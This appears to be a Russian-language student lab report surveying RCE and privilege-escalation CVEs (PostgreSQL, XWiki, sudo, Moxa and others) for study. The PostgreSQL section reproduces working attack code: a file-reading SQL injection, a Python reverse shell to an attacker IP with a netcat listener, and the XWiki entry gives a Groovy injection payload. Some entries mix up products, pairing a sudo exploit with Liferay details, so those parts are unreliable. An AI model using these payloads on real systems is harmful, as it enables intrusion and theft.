Лабораторная работа 2
Анализ уязвимостей RCE и LPE.
RCE
## CVE-2025-1094 - PostgreSQL SQL Injection RCE

Тип: RCE (Remote Code Execution)  
CVSS Score: 8.1 (High)
Продукт: PostgreSQL
Год: 2025
Ссылка на CVE: https://vulners.com/cve/CVE-2025-1094
Дата публикации: 2025

Описание: 
Неправильная нейтрализация в функциях PostgreSQL libpq допускает SQL-инъекции в определенных шаблонах, что может привести к удаленному выполнению кода.

Технические детали:
- Уязвимость в библиотеке libpq (PostgreSQL client library)
- SQL injection через специальные шаблоны
- Эскалация до remote code execution
- Требует определенных условий для эксплуатации
В этом репозитории содержится эксплойт с доказательством концепции (PoC) для CVE-2025-1094 — уязвимости в PostgreSQL, которая позволяет атаке SQL-инъекции (SQLi) перейти в стадию удаленного выполнения кода (RCE) посредством перехвата WebSocket.

Обзор
Этот эксплойт использует уязвимость SQL-инъекции в PostgreSQL для внедрения вредоносного кода, который считывает конфиденциальные файлы, такие как /etc/passwd, и сохраняет их на уязвимом сервере. Затем эксплойт перехватывает активное соединение WebSocket для выполнения произвольных команд, в конечном итоге получая доступ к удалённой оболочке на скомпрометированном сервере.

Подробности уязвимости
Идентификатор CVE : CVE-2025-1094
Уязвимая система : PostgreSQL (неправильно настроенные функции)
Путь эксплойта : SQL-инъекция → Перехват WebSocket → Удаленное выполнение кода (RCE)
Как это работает
SQL-инъекция (SQLi) : атака начинается с внедрения вредоносных SQL-команд в уязвимую конечную точку PostgreSQL. Полезная нагрузка используется lo_exportдля чтения конфиденциальных файлов с сервера.

Перехват WebSocket : злоумышленник перехватывает открытое соединение WebSocket и отправляет полезную нагрузку для выполнения RCE. Это запускает обратное соединение через шелл к системе злоумышленника.

Удаленное выполнение кода (RCE) : обратная оболочка предоставляет злоумышленнику полный контроль над сервером, что позволяет осуществлять дальнейшую эксплуатацию.

PoC (доказательство концепции)
SELECT lo_export( (SELECT convert_from(pg_read_file('/etc/passwd'), 'UTF8')), '/tmp/payload');
Приведённая выше полезная нагрузка SQL считывает /etc/passwdфайл и сохраняет его как /tmp/payload. После извлечения файла эксплойт использует перехват WebSocket для установки обратного шелла.

Описание: 
Неправильная нейтрализация в функциях PostgreSQL libpq допускает SQL-инъекции в определенных шаблонах, что может привести к удаленному выполнению кода.

Технические детали:
- Уязвимость в библиотеке libpq (PostgreSQL client library)
- SQL injection через специальные шаблоны
- Эскалация до remote code execution
- Требует определенных условий для эксплуатации

 
 

Что делает этот код:
Это программа для взлома серверов через уязвимость в PostgreSQL. Она состоит из 4 частей:

1. Настройка атаки
python
TARGET_URL = "http://vulnerable-site.com/vuln-endpoint"  # Сайт для атаки
WEBSOCKET_URL = "ws://vulnerable-site.com/socket"       # WebSocket соединение
REVERSE_IP = "YOUR_IP"      # IP хакера
REVERSE_PORT = 4444         # Порт для подключения


2. SQL-инъекция (кража файлов)
python
sql_payload = """SELECT lo_export(
  (SELECT convert_from(pg_read_file('/etc/passwd'), 'UTF8')), 
  '/tmp/payload'
);

Что делает:
•	Читает системный файл `/etc/passwd` с сервера
•	Сохраняет его в `/tmp/payload` на атакуемом сервере
•	Это доказательство, что уязвимость работает

3. WebSocket взлом (удаленное выполнение команд)
python
exploit_payload = f"""import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("{REVERSE_IP}",{REVERSE_PORT})); 
os.dup2(s.fileno(),0);  # Подключает ввод
os.dup2(s.fileno(),1);  # Подключает вывод  
os.dup2(s.fileno(),2);  # Подключает ошибки
p=subprocess.call(["/bin/sh","-i"]);"""  # Запускает оболочку

Что делает:
•	Устанавливает соединение с компьютером хакера
•	Запускает командную оболочку на сервере
•	Передает управление этой оболочкой хакеру

4. Ожидание подключения
python
def start_listener():
    os.system(f"nc -lvnp {REVERSE_PORT}")  # Слушает порт 4444

Что делает:
•	Хакер запускает прослушивание порта 4444
•	Ожидает, когда взломанный сервер подключится к нему


Как работает вся атака.

1. Хакер находит уязвимый сайт с PostgreSQL
2. Отправляет вредоносный SQL-запрос который читает файлы сервера
3. Подключается к WebSocket сервера
4. Через WebSocket отправляет код для обратного подключения
5. Сервер подключается к компьютеру хакера и отдает полный контроль
6. Хакер получает доступ к командной строке сервера

Что может хакер после успешной атаки:

•	Читать любые файлы на сервере
•	Изменять/удалять данные в базах
•	Устанавливать программы 
•	Атаковать другие серверы изнутри сети
•	Красть пароли и конфиденциальную информацию

Дополнительные меры:
- Проверять все пользовательские данные перед использованием в SQL
- Использовать защищенные настройки WebSocket
- Ограничить права доступа к базе данных
- Настроить брандмауэр






## CVE-2024-7627 - Bit File Manager WordPress Plugin RCE

Тип: RCE (Remote Code Execution)  
CVSS Score: 8.1 (High)
Продукт: Bit File Manager WordPress Plugin
Год:** 2024
Ссылка на CVE:https://vulners.com/cve/CVE-2024-7627
Дата публикации: 05 сентября 2024
Затронутые версии: 6.0 - 6.5

Описание:  
Плагин Bit File Manager для WordPress имеет уязвимость удаленного выполнения кода в версиях с 6.0 по 6.5.

Технические детали:
- Unauthenticated remote code execution
- Уязвимость в WordPress плагине управления файлами
- Позволяет выполнять произвольный код без аутентификации
- Критическая уязвимость для сайтов на WordPress

SQL Injection in CMS Made Simple - RCE

Тип: RCE (Remote Code Execution) через SQL Injection  
CVSS Score:8.1 (High) / 6.8 (CVSS v2)
Продукт: CMS Made Simple
Год: 2023-2024 (уязвимые версии до 2.2.10)
Ссылка на PoC: https://vulners.com/githubexploit/168436CA-996C-5CED-B039-DFE5B0562B2C
Дата публикации: 19 октября 2025
Затронутые версии: < 2.2.10

Описание:
Time-based unauthenticated SQL injection exploit for CMS Made Simple <2.2.10; extracts admin salt, username, email and password hash.

Технические детали:
- Unauthenticated SQL injection (не требует аутентификации)
- Time-based атака (слепая SQL инъекция)
- Извлечение чувствительных данных: admin salt, username, email, password hash
- Может приводить к полному compromise системы через получение учетных данных администратора

## CVE-2024-31982 - XWiki Platform Remote Code Execution

Тип: RCE (Remote Code Execution)  
CVSS Score: 9.8 (Critical)
Продукт: XWiki Platform
Год:2024
Ссылка на CVE: https://vulners.com/cve/CVE-2024-31982
Дата публикации 2024
Описание:
XWiki Platform позволяет удаленное выполнение кода через database search text, воздействуя на конфиденциальность, целостность и доступность данных.

Технические детали:
- Remote code execution через поле поиска в базе данных
- Уязвимость в механизме поиска XWiki
- Позволяет выполнять произвольный код на сервере
- Критическое воздействие на все аспекты безопасности (CIA triad)
 
 
![Uploading image.png…]()
 

Назначение: Удаленное выполнение кода (RCE) в XWiki Platform версий > 14.10.20
Как работает:
- Уязвимый эндпоинт: `/xwiki/bin/get/Main/DatabaseSearch`
- Полезная нагрузка: Внедрение Groovy-кода через шаблоны
- Проверка: Отправка `println("Hello, World!")` и поиск ответа
Технические детали:
- Метод: GET-запрос с инъекцией в параметр `text`
- Полезная нагрузка: `}}}}{{async async=false}}{{groovy}}println("Hello, World!"){{/groovy}}{{/async}}`
- Верификация: Проверка наличия "Hello, World!" в ответе
Функционал скрипта:
- Одиночное и массовое сканирование
- Многопоточность (10 потоков)
- Логирование результатов
- Цветной вывод статусов

Уровень угрозы:  Критический - позволяет выполнять произвольный код на сервере




## CVE-2025-57567 - PluXml CMS Remote Code Execution
https://vulners.com/redhatcve/RH:CVE-2025-57567

Тип: RCE (Remote Code Execution)
CVSS Score: 9.1 (Critical)
Продукт: PluXml CMS
Год:2025
Описание: Remote code execution в PluXml CMS позволяет администратору перезаписать minify.php и выполнять команды






LPE
CVE-2025-6893
Тип: LPE (local privilege escalation)  
CVSS Score: 9.3 (High)
Продукт: MOXA
Год: 2025
Ссылка на CVE: https://vulners.com/cve/CVE-2025-6893
Дата публикации: 2025
Описание: 
Нарушенный контроль доступа к /api/v1/setting/data позволяет аутентифицированным пользователям с низкими привилегиями получать доступ или изменять настройки на устройствах Moxa.
Технические детали:
1. Неконтролируемый доступ к API endpoint  
2. Нарушение принципа минимальных привилегий 
3. Отсутствие валидации уровня доступа на уровне API  


CVE-2025-6949
Тип: LPE (local privilege escalation)  
CVSS Score: 9.3 (High)
Продукт: MOXA
Год: 2025
Ссылка на CVE: https://vulners.com/nvd/NVD:CVE-2025-6949
Дата публикации: 2025
Описание: 
Уязвимость CVE-2025-6949 позволяет аутентифицированным пользователям с низким уровнем привилегий создавать учетные записи администраторов на устройствах Moxa, получая полный контроль и подвергаясь риску выдачи себя за другое лицо. 
Технические детали:
1.Небезопасная десериализация данных в обработчике API
2.Отсутствие проверки прав доступа к критическим функциям
3.Уязвимость типа "SQL Injection" в параметрах запроса
4.Недостатки валидации входных данных в файловых операциях

CVE-2025-32462
Тип: LPE (local privilege escalation)  
CVSS Score: 8.8-9.3 (High)
Продукт: RockyLinux 10
Год: 2025
Ссылка на CVE: https://vulners.com/nessus/ROCKY_LINUX_RLSA-2025-11537.NASL
Дата публикации: 2025
Описание: 
Rocky Linux 10 host sudo LPE через параметры host и chroot (CVE-2025-32462, CVE-2025-32463) согласно RLSA-2025:11537. На удаленном хосте RockyLinux 10 установлены пакеты, подверженные множественным уязвимостям, как указано в рекомендации RLSA-2025:11537.

Технические детали:
1.LPE через параметр host в sudo (CVE-2025-32462) — обход ограничений за счёт неправильной обработки опции host
2.LPE через параметр chroot в sudo (CVE-2025-32463) — уязвимость в механизме смены корневого каталога, позволяющая выполнить произвольные команды с повышенными привилегиями
3.Использование уязвимого файла nsswitch.conf — манипуляция конфигурацией разрешения имён для обхода политик безопасности
4.Недостаточная изоляция процессов в sudo

https://github.com/CryingN/CVE-2025-32462/blob/master/poc.sh
Назначение: Эксплойт для проверки привилегий sudo (PoC CVE-2025-32462)

Что делает скрипт:
1. Проверяет root-права - требует запуска от суперпользователя
2. Анализирует /etc/sudoers - ищет пользователей с `NOPASSWD:ALL`
3. Автоматически переключается на найденного пользователя через `sudo -i`
Ключевые команды:
- check_sudoers() - парсит sudoers на наличие привилегий без пароля
- sudo -i -h $user - переключается на пользователя с полными правами
Уровень угрозы:  Высокий - автоматизирует поиск и использование слабых настроек sudo

CVE-2025-32463
Тип: LPE (local privilege escalation)  
CVSS Score: 7.8-9.3 (High)
Продукт: Liferay
Год: 2025
Ссылка на CVE: https://vulners.com/githubexploit/70D87358-07A4-5B2B-AF9A-9374F86EAF95
Дата публикации: 2025
Описание: 
PoC для CVE-2025-32463, локальное повышение привилегий sudo через chroot и ненадежный nsswitch.conf.
Технические детали:
1.Обход авторизации через пользовательский ключ
2.Insecure Direct Object Reference (IDOR) в Liferay Portal
3.Межэкземплярное назначение организаций пользователям
4.Недостаточная проверка прав доступа между виртуальными экземплярами

https://github.com/pr0v3rbs/CVE-2025-32463_chwoot/blob/main/sudo-chwoot.sh
Назначение: Эксплойт для повышения привилегий (EoP) через уязвимость в sudo (CVE-2025-32463)

Как работает:
1. Создает временную директорию для работы
2. Генерирует вредоносную библиотеку `libnss_/woot1337.so.2`
3. Использует уязвимость sudo -R для загрузки своей библиотеки
4. Выполняет код с root-правами через конструктор `__attribute__((constructor))`

Ключевые элементы:
- `setreuid(0,0)` - устанавливает root-привилегии
- `execl("/bin/sh", ...)` - выполняет команду от root
- `sudo -R woot woot` - триггерит уязвимость

Уровень угрозы:  Критический - дает полный root-доступ

CVE-2025-34194
Тип: LPE (local privilege escalation)  
CVSS Score: 8.5 (High)
Продукт: Vasion Print (ранее PrinterLogic)
Год: 2025
Ссылка на CVE: https://vulners.com/cvelist/CVELIST:CVE-2025-34194
Дата публикации: 2025
Описание: 
CVE-2025-34194: локальное повышение привилегий Vasion Print посредством небезопасной обработки временных файлов.
Технические детали:
1.Небезопасная обработка временных файлов в PrinterInstallerClient
2.Создание файлов с правами SYSTEM в пользовательской директории Temp
3.Возможность атаки через символические ссылки (symlink attack)
4.Перезапись системных файлов через race condition
